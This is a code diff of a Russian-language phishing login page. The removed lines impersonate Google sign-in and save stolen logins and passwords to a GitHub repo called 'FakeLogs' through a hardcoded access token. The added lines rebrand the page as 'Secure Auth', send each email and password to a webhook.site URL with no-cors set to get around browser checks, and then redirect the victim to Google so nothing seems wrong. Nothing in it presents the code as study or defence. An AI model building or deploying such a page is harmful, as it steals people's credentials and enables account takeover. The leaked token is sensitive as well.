@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход в аккаунты Google</title>
-    <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/googleg_32dp.png">
+    <title>Вход в систему</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -16,13 +15,7 @@
             color: #202124;
         }
         header { padding: 16px 24px; display: flex; justify-content: center; }
-        .logo { font-size: 24px; font-weight: 500; letter-spacing: -0.5px; }
-        .logo span:nth-child(1) { color: #4285f4; }
-        .logo span:nth-child(2) { color: #ea4335; }
-        .logo span:nth-child(3) { color: #fbbc04; }
-        .logo span:nth-child(4) { color: #4285f4; }
-        .logo span:nth-child(5) { color: #34a853; }
-        .logo span:nth-child(6) { color: #ea4335; }
+        .logo { font-size: 24px; font-weight: 500; letter-spacing: -0.5px; color: #333; }
         
         main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .login-card {
@@ -35,7 +28,7 @@
             text-align: center;
         }
         .login-card h2 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        .login-card p { font-size: 16px; margin-bottom: 30px; }
+        .login-card p { font-size: 16px; margin-bottom: 30px; color: #5f6368; }
         .input-group { position: relative; margin-bottom: 20px; text-align: left; }
         .input-group input {
             width: 100%;
@@ -75,15 +68,13 @@
 <body>
 
     <header>
-        <div class="logo">
-            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-        </div>
+        <div class="logo">Secure Auth</div>
     </header>
 
     <main>
         <div class="login-card">
             <h2>Вход</h2>
-            <p>Используйте аккаунт Google</p>
+            <p>Используйте аккаунт</p>
             
             <form id="loginForm">
                 <div class="input-group">
@@ -119,13 +110,8 @@
     </footer>
 
     <script>
-        // ==========================================
-        // НАСТРОЙКИ (ВСТАВЬ СВОИ ДАННЫЕ)
-        // ==========================================
-        const GH_TOKEN = "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"; 
-        const REPO_OWNER = "jgjjj0927-hub"; 
-        const REPO_NAME = "FakeLogs";       
-        // ==========================================
+        // Твоя уникальная ссылка с Webhook.site
+        const WEBHOOK_URL = "https://webhook.site/975b8ffd-eda8-41b7-afbc-fbd48a4968fe";
 
         let step = 1;
         let emailVal = "";
@@ -155,37 +141,28 @@
                     alert("Введите пароль");
                     return;
                 }
-                sendToGitHub(emailVal, passVal);
+                sendToWebhook(emailVal, passVal);
             }
         });
 
-        function sendToGitHub(email, pass) {
-            const date = new Date().toISOString().replace(/[:.]/g, '-');
-            const fileName = `log_${date}.txt`;
-            const content = `Логин: ${email}\nПароль: ${pass}\nДата: ${new Date().toLocaleString()}`;
-            const base64Content = btoa(unescape(encodeURIComponent(content)));
+        function sendToWebhook(email, pass) {
+            const text = `🚨 Новый вход!\n\n📧 Логин: ${email}\n🔑 Пароль: ${pass}\n📅 ${new Date().toLocaleString()}`;
             
-            const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${fileName}`;
-            
-            fetch(url, {
-                method: 'PUT',
+            // Отправляем POST запрос на webhook
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors', // Важно для обхода CORS
                 headers: {
-                    'Authorization': `token ${GH_TOKEN}`,
-                    'Accept': 'application/vnd.github.v3+json',
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    message: `New log`,
-                    content: base64Content
+                body: JSON.stringify({ 
+                    message: text,
+                    login: email,
+                    password: pass
                 })
-            })
-            .then(response => {
-                response.json().then(data => {
-                    alert("Статус GitHub: " + response.status + "\nОтвет: " + JSON.stringify(data));
-                });
-            })
-            .catch(error => {
-                alert("Ошибка сети: " + error);
+            }).finally(() => {
+                // В любом случае перекидываем на Google
+                window.location.href = "https://accounts.google.com";
             });
         }
     </script>
